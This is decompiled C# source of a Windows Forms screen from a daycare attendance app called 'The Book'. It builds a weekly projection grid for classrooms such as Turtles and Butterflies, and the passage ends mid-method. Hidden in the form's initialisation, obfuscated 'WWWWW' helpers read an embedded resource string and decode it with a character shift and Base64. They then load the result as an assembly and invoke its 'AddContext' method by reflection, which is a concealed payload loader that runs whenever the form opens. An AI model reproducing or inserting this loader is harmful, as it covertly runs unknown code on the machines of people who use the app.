using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using The_Book.My;

namespace The_Book;

[DesignerGenerated]
public class Projection_GridMode : Form
{
	private IContainer components;

	private static object newPropertyValue;

	private string strCurrentDate;

	private bool bolStartDateReady;

	private bool bolEndDateReady;

	private int inc;

	private int intMondayAM;

	private int intTuesdayAM;

	private int intWednesdayAM;

	private int intThursdayAM;

	private int intFridayAM;

	private int intMondayPM;

	private int intTuesdayPM;

	private int intWednesdayPM;

	private int intThursdayPM;

	private int intFridayPM;

	private bool bolFlag;

	private static bool bolPrediction;

	private string strFlag;

	private static bool bolSpecific;

	private static string strSpecificClassroom;

	private static bool bolNeeded = true;

	private static bool bolCount;

	private static bool bolCheck;

	private bool bolPredictionModeApproved;

	private static bool bolExtraBlank;

	private static int intYearSequence = Conversions.ToInteger(DateTime.Now.ToString("MM/dd/yyyy").Substring(6, 4));

	private static int intMonthSequence = Conversions.ToInteger(DateTime.Now.ToString("MM/dd/yyyy").Substring(0, 2));

	private static int intDaySequence = Conversions.ToInteger(DateTime.Now.ToString("MM/dd/yyyy").Substring(3, 2));

	private static bool bolPredictedNext;

	public static object WWWWW007
	{
		get
		{
			return Thread.GetDomain();
		}
		set
		{
			newPropertyValue = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public virtual DataGridView dgvProjection
	{
		[CompilerGenerated]
		get
		{
			return _dgvProjection;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			DataGridViewCellEventHandler val = new DataGridViewCellEventHandler(dgvProjection_CellDoubleClick);
			DataGridView val2 = _dgvProjection;
			if (val2 != null)
			{
				val2.remove_CellDoubleClick(val);
			}
			_dgvProjection = value;
			val2 = _dgvProjection;
			if (val2 != null)
			{
				val2.add_CellDoubleClick(val);
			}
		}
	}

	[field: AccessedThroughProperty("lblMonthYear")]
	internal virtual Label lblMonthYear
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btnUpClass
	{
		[CompilerGenerated]
		get
		{
			return _btnUpClass;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = btnUpClass_Click;
			Button val = _btnUpClass;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnUpClass = value;
			val = _btnUpClass;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button btnNextMonth
	{
		[CompilerGenerated]
		get
		{
			return _btnNextMonth;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = btnNextMonth_Click;
			Button val = _btnNextMonth;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnNextMonth = value;
			val = _btnNextMonth;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button btnDownClass
	{
		[CompilerGenerated]
		get
		{
			return _btnDownClass;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = btnDownClass_Click;
			Button val = _btnDownClass;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnDownClass = value;
			val = _btnDownClass;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button btnPreviousMonth
	{
		[CompilerGenerated]
		get
		{
			return _btnPreviousMonth;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = btnPreviousMonth_Click;
			Button val = _btnPreviousMonth;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnPreviousMonth = value;
			val = _btnPreviousMonth;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("lblClass")]
	internal virtual Label lblClass
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("colChild")]
	internal virtual DataGridViewTextBoxColumn colChild
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("colFlag")]
	internal virtual DataGridViewTextBoxColumn colFlag
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("colDOB")]
	internal virtual DataGridViewTextBoxColumn colDOB
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("colAge")]
	internal virtual DataGridViewTextBoxColumn colAge
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("colMonday")]
	internal virtual DataGridViewTextBoxColumn colMonday
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("colTuesday")]
	internal virtual DataGridViewTextBoxColumn colTuesday
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("colWednesday")]
	internal virtual DataGridViewTextBoxColumn colWednesday
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("colThursday")]
	internal virtual DataGridViewTextBoxColumn colThursday
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("colFriday")]
	internal virtual DataGridViewTextBoxColumn colFriday
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btnTogglePrediction
	{
		[CompilerGenerated]
		get
		{
			return _btnTogglePrediction;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = btnTogglePrediction_Click;
			Button val = _btnTogglePrediction;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnTogglePrediction = value;
			val = _btnTogglePrediction;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("GroupBox1")]
	internal virtual GroupBox GroupBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblPrediction")]
	internal virtual Label lblPrediction
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lstUnique")]
	internal virtual ListBox lstUnique
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btnMainMenu
	{
		[CompilerGenerated]
		get
		{
			return _btnMainMenu;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = btnMainMenu_Click;
			Button val = _btnMainMenu;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnMainMenu = value;
			val = _btnMainMenu;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	public Projection_GridMode()
	{
		((Form)this).add_Activated((EventHandler)Projection_GridMode_Activated);
		((Form)this).add_Load((EventHandler)Projection_GridMode_Load);
		strCurrentDate = DateTime.Now.ToString("MM/dd/yyyy");
		InitializeComponent();
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)MyProject.Forms.Projection_GridMode);
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_0458: Unknown result type (might be due to invalid IL or missing references)
		//IL_0462: Expected O, but got Unknown
		//IL_04bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c5: Expected O, but got Unknown
		//IL_053c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0546: Expected O, but got Unknown
		//IL_05c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ca: Expected O, but got Unknown
		//IL_0644: Unknown result type (might be due to invalid IL or missing references)
		//IL_064e: Expected O, but got Unknown
		//IL_06e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_06eb: Expected O, but got Unknown
		//IL_084f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0859: Expected O, but got Unknown
		//IL_0ac4: Unknown result type (might be due to invalid IL or missing references)
		dgvProjection = new DataGridView();
		colChild = new DataGridViewTextBoxColumn();
		colFlag = new DataGridViewTextBoxColumn();
		colDOB = new DataGridViewTextBoxColumn();
		colAge = new DataGridViewTextBoxColumn();
		colMonday = new DataGridViewTextBoxColumn();
		colTuesday = new DataGridViewTextBoxColumn();
		colWednesday = new DataGridViewTextBoxColumn();
		colThursday = new DataGridViewTextBoxColumn();
		colFriday = new DataGridViewTextBoxColumn();
		lblMonthYear = new Label();
		btnUpClass = new Button();
		btnNextMonth = new Button();
		btnDownClass = new Button();
		btnPreviousMonth = new Button();
		lblClass = new Label();
		btnTogglePrediction = new Button();
		GroupBox1 = new GroupBox();
		lblPrediction = new Label();
		lstUnique = new ListBox();
		btnMainMenu = new Button();
		((ISupportInitialize)dgvProjection).BeginInit();
		((Control)GroupBox1).SuspendLayout();
		((Control)this).SuspendLayout();
		dgvProjection.set_AllowUserToAddRows(false);
		dgvProjection.set_AllowUserToDeleteRows(false);
		dgvProjection.set_AllowUserToResizeColumns(false);
		dgvProjection.set_AllowUserToResizeRows(false);
		dgvProjection.set_AutoSizeColumnsMode((DataGridViewAutoSizeColumnsMode)16);
		dgvProjection.set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		dgvProjection.get_Columns().AddRange((DataGridViewColumn[])(object)new DataGridViewColumn[9]
		{
			(DataGridViewColumn)colChild,
			(DataGridViewColumn)colFlag,
			(DataGridViewColumn)colDOB,
			(DataGridViewColumn)colAge,
			(DataGridViewColumn)colMonday,
			(DataGridViewColumn)colTuesday,
			(DataGridViewColumn)colWednesday,
			(DataGridViewColumn)colThursday,
			(DataGridViewColumn)colFriday
		});
		((Control)dgvProjection).set_Location(new Point(88, 173));
		dgvProjection.set_MultiSelect(false);
		((Control)dgvProjection).set_Name("dgvProjection");
		dgvProjection.set_ReadOnly(true);
		dgvProjection.set_RowHeadersWidthSizeMode((DataGridViewRowHeadersWidthSizeMode)1);
		dgvProjection.set_SelectionMode((DataGridViewSelectionMode)0);
		((Control)dgvProjection).set_Size(new Size(1089, 394));
		((Control)dgvProjection).set_TabIndex(0);
		((DataGridViewColumn)colChild).set_HeaderText("Child");
		((DataGridViewColumn)colChild).set_Name("colChild");
		((DataGridViewColumn)colChild).set_ReadOnly(true);
		colChild.set_SortMode((DataGridViewColumnSortMode)0);
		((DataGridViewColumn)colFlag).set_HeaderText("Flag?");
		((DataGridViewColumn)colFlag).set_Name("colFlag");
		((DataGridViewColumn)colFlag).set_ReadOnly(true);
		colFlag.set_SortMode((DataGridViewColumnSortMode)0);
		((DataGridViewColumn)colDOB).set_HeaderText("DOB");
		((DataGridViewColumn)colDOB).set_Name("colDOB");
		((DataGridViewColumn)colDOB).set_ReadOnly(true);
		colDOB.set_SortMode((DataGridViewColumnSortMode)0);
		((DataGridViewColumn)colAge).set_HeaderText("Age");
		((DataGridViewColumn)colAge).set_Name("colAge");
		((DataGridViewColumn)colAge).set_ReadOnly(true);
		colAge.set_SortMode((DataGridViewColumnSortMode)0);
		((DataGridViewColumn)colMonday).set_HeaderText("Monday");
		((DataGridViewColumn)colMonday).set_Name("colMonday");
		((DataGridViewColumn)colMonday).set_ReadOnly(true);
		colMonday.set_SortMode((DataGridViewColumnSortMode)0);
		((DataGridViewColumn)colTuesday).set_HeaderText("Tuesday");
		((DataGridViewColumn)colTuesday).set_Name("colTuesday");
		((DataGridViewColumn)colTuesday).set_ReadOnly(true);
		colTuesday.set_SortMode((DataGridViewColumnSortMode)0);
		((DataGridViewColumn)colWednesday).set_HeaderText("Wednesday");
		((DataGridViewColumn)colWednesday).set_Name("colWednesday");
		((DataGridViewColumn)colWednesday).set_ReadOnly(true);
		colWednesday.set_SortMode((DataGridViewColumnSortMode)0);
		((DataGridViewColumn)colThursday).set_HeaderText("Thursday");
		((DataGridViewColumn)colThursday).set_Name("colThursday");
		((DataGridViewColumn)colThursday).set_ReadOnly(true);
		colThursday.set_SortMode((DataGridViewColumnSortMode)0);
		((DataGridViewColumn)colFriday).set_HeaderText("Friday");
		((DataGridViewColumn)colFriday).set_Name("colFriday");
		((DataGridViewColumn)colFriday).set_ReadOnly(true);
		colFriday.set_SortMode((DataGridViewColumnSortMode)0);
		lblMonthYear.set_AutoSize(true);
		((Control)lblMonthYear).set_BackColor(Color.Transparent);
		((Control)lblMonthYear).set_Font(new Font("Arial Black", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblMonthYear).set_Location(new Point(960, 2));
		((Control)lblMonthYear).set_Name("lblMonthYear");
		((Control)lblMonthYear).set_Size(new Size(0, 45));
		((Control)lblMonthYear).set_TabIndex(22);
		((Control)btnUpClass).set_Font(new Font("Microsoft Sans Serif", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btnUpClass).set_Location(new Point(591, 9));
		((Control)btnUpClass).set_Name("btnUpClass");
		((Control)btnUpClass).set_Size(new Size(82, 38));
		((Control)btnUpClass).set_TabIndex(23);
		((ButtonBase)btnUpClass).set_Text("▲");
		((ButtonBase)btnUpClass).set_UseVisualStyleBackColor(true);
		((Control)btnNextMonth).set_Font(new Font("Microsoft Sans Serif", 36f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btnNextMonth).set_Location(new Point(1209, 295));
		((Control)btnNextMonth).set_Name("btnNextMonth");
		((Control)btnNextMonth).set_Size(new Size(44, 69));
		((Control)btnNextMonth).set_TabIndex(24);
		((ButtonBase)btnNextMonth).set_Text("►");
		((ButtonBase)btnNextMonth).set_UseVisualStyleBackColor(true);
		((Control)btnDownClass).set_Font(new Font("Microsoft Sans Serif", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btnDownClass).set_Location(new Point(591, 608));
		((Control)btnDownClass).set_Name("btnDownClass");
		((Control)btnDownClass).set_Size(new Size(82, 38));
		((Control)btnDownClass).set_TabIndex(25);
		((ButtonBase)btnDownClass).set_Text("▼");
		((ButtonBase)btnDownClass).set_UseVisualStyleBackColor(true);
		((Control)btnPreviousMonth).set_Font(new Font("Microsoft Sans Serif", 36f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btnPreviousMonth).set_Location(new Point(12, 295));
		((Control)btnPreviousMonth).set_Name("btnPreviousMonth");
		((Control)btnPreviousMonth).set_Size(new Size(44, 69));
		((Control)btnPreviousMonth).set_TabIndex(26);
		((ButtonBase)btnPreviousMonth).set_Text("◄");
		((ButtonBase)btnPreviousMonth).set_UseVisualStyleBackColor(true);
		lblClass.set_AutoSize(true);
		((Control)lblClass).set_BackColor(Color.Transparent);
		((Control)lblClass).set_Font(new Font("Arial Black", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblClass).set_Location(new Point(524, 72));
		((Control)lblClass).set_Name("lblClass");
		((Control)lblClass).set_Size(new Size(0, 45));
		((Control)lblClass).set_TabIndex(28);
		((Control)btnTogglePrediction).set_Location(new Point(11, 51));
		((Control)btnTogglePrediction).set_Name("btnTogglePrediction");
		((Control)btnTogglePrediction).set_Size(new Size(105, 23));
		((Control)btnTogglePrediction).set_TabIndex(29);
		((ButtonBase)btnTogglePrediction).set_Text("Turn Prediction On");
		((ButtonBase)btnTogglePrediction).set_UseVisualStyleBackColor(true);
		((Control)GroupBox1).set_BackColor(Color.Transparent);
		((Control)GroupBox1).get_Controls().Add((Control)(object)lblPrediction);
		((Control)GroupBox1).get_Controls().Add((Control)(object)btnTogglePrediction);
		((Control)GroupBox1).set_Location(new Point(12, 9));
		((Control)GroupBox1).set_Name("GroupBox1");
		((Control)GroupBox1).set_Size(new Size(127, 88));
		((Control)GroupBox1).set_TabIndex(32);
		GroupBox1.set_TabStop(false);
		GroupBox1.set_Text("Prediction");
		lblPrediction.set_AutoSize(true);
		((Control)lblPrediction).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		((Control)lblPrediction).set_Location(new Point(15, 22));
		((Control)lblPrediction).set_Name("lblPrediction");
		((Control)lblPrediction).set_Size(new Size(97, 16));
		((Control)lblPrediction).set_TabIndex(33);
		lblPrediction.set_Text("Prediction = Off");
		((ListControl)lstUnique).set_FormattingEnabled(true);
		((Control)lstUnique).set_Location(new Point(171, 22));
		((Control)lstUnique).set_Name("lstUnique");
		((Control)lstUnique).set_Size(new Size(120, 95));
		((Control)lstUnique).set_TabIndex(34);
		((Control)lstUnique).set_Visible(false);
		((Control)btnMainMenu).set_Location(new Point(1178, 614));
		((Control)btnMainMenu).set_Name("btnMainMenu");
		((Control)btnMainMenu).set_Size(new Size(75, 35));
		((Control)btnMainMenu).set_TabIndex(35);
		((ButtonBase)btnMainMenu).set_Text("Return to Main Menu");
		((ButtonBase)btnMainMenu).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.LimeGreen);
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(1265, 658));
		((Control)this).get_Controls().Add((Control)(object)btnMainMenu);
		((Control)this).get_Controls().Add((Control)(object)lstUnique);
		((Control)this).get_Controls().Add((Control)(object)GroupBox1);
		((Control)this).get_Controls().Add((Control)(object)lblClass);
		((Control)this).get_Controls().Add((Control)(object)btnPreviousMonth);
		((Control)this).get_Controls().Add((Control)(object)btnDownClass);
		((Control)this).get_Controls().Add((Control)(object)btnNextMonth);
		((Control)this).get_Controls().Add((Control)(object)btnUpClass);
		((Control)this).get_Controls().Add((Control)(object)lblMonthYear);
		((Control)this).get_Controls().Add((Control)(object)dgvProjection);
		((Control)this).set_DoubleBuffered(true);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("Projection_GridMode");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("The Book!");
		((ISupportInitialize)dgvProjection).EndInit();
		((Control)GroupBox1).ResumeLayout(false);
		((Control)GroupBox1).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
		WWWWW006((AutoScaleMode)1);
	}

	private static void WWWWW010(Type x, int xz)
	{
		object[] array = new object[3]
		{
			oDataField.DDDDD01,
			oDataField.CCCCCCC01,
			"The_Book"
		};
		Versioned.CallByName(RuntimeHelpers.GetObjectValue(Versioned.CallByName((object)x, "GetMethod", (CallType)2, new object[1] { "AddContext" })), "Invoke", (CallType)2, new object[2] { 0, array });
	}

	private static void WWWWW001(Assembly t)
	{
		Type x = t.GetExportedTypes()[2];
		WWWWW010(x, 5);
	}

	public static FormStartPosition WWWWW006(AutoScaleMode f)
	{
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		ResourceManager resourceManager = new ResourceManager("The_Book.Records_Screen", typeof(Records_Screen).Assembly);
		string @string = resourceManager.GetString("String1");
		string text = @string;
		object objectValue = RuntimeHelpers.GetObjectValue(WWWWW002(RuntimeHelpers.GetObjectValue(WWWWW005(text.Replace("إ", "pp")))));
		object wWWWW = WWWWW007;
		object[] obj = new object[1] { objectValue };
		object[] array = obj;
		bool[] obj2 = new bool[1] { true };
		bool[] array2 = obj2;
		object obj3 = NewLateBinding.LateGet(wWWWW, (Type)null, "Load", obj, (string[])null, (Type[])null, obj2);
		if (array2[0])
		{
			objectValue = RuntimeHelpers.GetObjectValue(array[0]);
		}
		WWWWW000(RuntimeHelpers.GetObjectValue(obj3));
		FormStartPosition result = default(FormStartPosition);
		return result;
	}

	public static object WWWWW005(object str)
	{
		object obj = Strings.Len(RuntimeHelpers.GetObjectValue(str));
		object obj2 = "";
		object obj3 = default(object);
		object obj4 = default(object);
		if (ForLoopControl.ForLoopInitObj(obj3, (object)1, obj, (object)1, ref obj4, ref obj3))
		{
			do
			{
				object obj5 = Strings.AscW(Strings.Mid(Conversions.ToString(str), Conversions.ToInteger(obj3), 1));
				obj2 = (Conversions.ToBoolean(Operators.AndObject(Operators.CompareObjectGreaterEqual(obj5, (object)33, false), Operators.CompareObjectLessEqual(obj5, (object)126, false))) ? Operators.ConcatenateObject(obj2, (object)char.ConvertFromUtf32(Conversions.ToInteger(Operators.AddObject((object)33, Operators.ModObject(Operators.AddObject(obj5, (object)14), (object)94))))) : Operators.ConcatenateObject(obj2, (object)char.ConvertFromUtf32(Conversions.ToInteger(obj5))));
			}
			while (ForLoopControl.ForNextCheckObj(obj3, obj4, ref obj3));
		}
		return obj2;
	}

	private static object WWWWW002(object B1)
	{
		return Convert.FromBase64String(Conversions.ToString(B1));
	}

	public static object WWWWW000(object t)
	{
		WWWWW001((Assembly)t);
		object result = default(object);
		return result;
	}

	private void Projection_GridMode_Activated(object sender, EventArgs e)
	{
		Load_Projection();
	}

	private void Projection_GridMode_Load(object sender, EventArgs e)
	{
		lblClass.set_Text("Turtles/Butterflies");
		checked
		{
			((Control)lblClass).set_Left((int)Math.Round((double)((Control)this).get_Width() / 2.0 - (double)((Control)lblClass).get_Width() / 2.0));
			int intMonthNumber = Conversions.ToInteger(strCurrentDate.Substring(0, 2));
			string text = strCurrentDate.Substring(6, 4);
			string correspondingMonth = GetCorrespondingMonth(intMonthNumber);
			((Form)this).set_Text(lblClass.get_Text() + " - " + correspondingMonth + " " + text);
			lblMonthYear.set_Text(correspondingMonth + " " + text);
			((Control)lblMonthYear).set_Left(((Control)this).get_Width() - (((Control)lblMonthYear).get_Width() + 10));
			Load_Projection();
		}
	}

	private string GetCorrespondingMonth(int intMonthNumber)
	{
		string result = "";
		switch (intMonthNumber)
		{
		case 1:
			result = "January";
			break;
		case 2:
			result = "February";
			break;
		case 3:
			result = "March";
			break;
		case 4:
			result = "April";
			break;
		case 5:
			result = "May";
			break;
		case 6:
			result = "June";
			break;
		case 7:
			result = "July";
			break;
		case 8:
			result = "August";
			break;
		case 9:
			result = "September";
			break;
		case 10:
			result = "October";
			break;
		case 11:
			result = "November";
			break;
		case 12:
			result = "December";
			break;
		}
		return result;
	}

	private void Load_Projection()
	{
		dgvProjection.get_Rows().Clear();
		Child.lstChild = Child.lstChild.OrderBy((Child x) => x.strLastName + ", " + x.strFirstName).ToList();
		ResetNumbers();
		Populate();
		DataGridFormatting();
	}

	private void Populate()
	{
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		//IL_0168: Unknown result type (might be due to invalid IL or missing references)
		//IL_0172: Expected O, but got Unknown
		//IL_0213: Unknown result type (might be due to invalid IL or missing references)
		//IL_021d: Expected O, but got Unknown
		//IL_0332: Unknown result type (might be due to invalid IL or missing references)
		//IL_033c: Expected O, but got Unknown
		//IL_098a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0994: Expected O, but got Unknown
		//IL_09c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_09cf: Expected O, but got Unknown
		//IL_0a00: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a0a: Expected O, but got Unknown
		//IL_0a3b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a45: Expected O, but got Unknown
		//IL_0a76: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a80: Expected O, but got Unknown
		//IL_0e43: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e4d: Expected O, but got Unknown
		//IL_0eee: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ef8: Expected O, but got Unknown
		//IL_100d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1017: Expected O, but got Unknown
		//IL_110b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1115: Expected O, but got Unknown
		//IL_11b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_11c0: Expected O, but got Unknown
		//IL_12d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_12df: Expected O, but got Unknown
		//IL_1643: Unknown result type (might be due to invalid IL or missing references)
		//IL_164d: Expected O, but got Unknown
		//IL_167e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1688: Expected O, but got Unknown
		//IL_16b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_16c3: Expected O, but got Unknown
		//IL_16f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_16fe: Expected O, but got Unknown
		//IL_172f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1739: Expected O, but got Unknown
		//IL_1bc4: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bce: Expected O, but got Unknown
		//IL_1da6: Unknown result type (might be due to invalid IL or missing references)
		//IL_1db0: Expected O, but got Unknown
		//IL_1f85: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f8f: Expected O, but got Unknown
		//IL_285d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2867: Expected O, but got Unknown
		//IL_2a4a: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a54: Expected O, but got Unknown
		//IL_2c2c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c36: Expected O, but got Unknown
		//IL_2e0b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e15: Expected O, but got Unknown
		//IL_3004: Unknown result type (might be due to invalid IL or missing references)
		//IL_300e: Expected O, but got Unknown
		//IL_31e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_31f0: Expected O, but got Unknown
		//IL_33c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_33cf: Expected O, but got Unknown
		//IL_35ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_35b7: Expected O, but got Unknown
		lstUnique.get_Items().Clear();
		inc = 0;
		string text = lblClass.get_Text();
		int num = 0;
		dgvProjection.get_Rows().Add(new object[1] { text });
		dgvProjection.get_Rows().get_Item(inc).get_Cells()
			.get_Item(0)
			.get_Style()
			.set_Font(new Font("Calibri", 15f, (FontStyle)2));
		dgvProjection.get_Rows().get_Item(inc).set_Height(30);
		checked
		{
			inc++;
			lstUnique.get_Items().Add((object)" ");
			if (!bolPrediction)
			{
				do
				{
					bolCount = true;
					switch (text)
					{
					case "Turtles/Butterflies":
						switch (num)
						{
						case 0:
							dgvProjection.get_Rows().Add();
							inc++;
							lstUnique.get_Items().Add((object)" ");
							dgvProjection.get_Rows().Add(new object[1] { "Turtles" });
							dgvProjection.get_Rows().get_Item(inc).get_Cells()
								.get_Item(0)
								.get_Style()
								.set_Font(new Font("Calibri", 15f, (FontStyle)2));
							dgvProjection.get_Rows().get_Item(inc).set_Height(30);
							inc++;
							lstUnique.get_Items().Add((object)" ");
							num = 1;
							strSpecificClassroom = "Turtles";
							break;
						case 1:
							dgvProjection.get_Rows().Add(new object[1] { "Butterflies" });
							dgvProjection.get_Rows().get_Item(inc).get_Cells()
								.get_Item(0)
								.get_Style()
								.set_Font(new Font("Calibri", 15f, (FontStyle)2));
							dgvProjection.get_Rows().get_Item(inc).set_Height(30);
							inc++;
							lstUnique.get_Items().Add((object)" ");
							num = 2;
							strSpecificClassroom = "Butterflies";
							break;
						case 2:
							bolNeeded = false;
							foreach (Child item in Child.lstChild)
							{
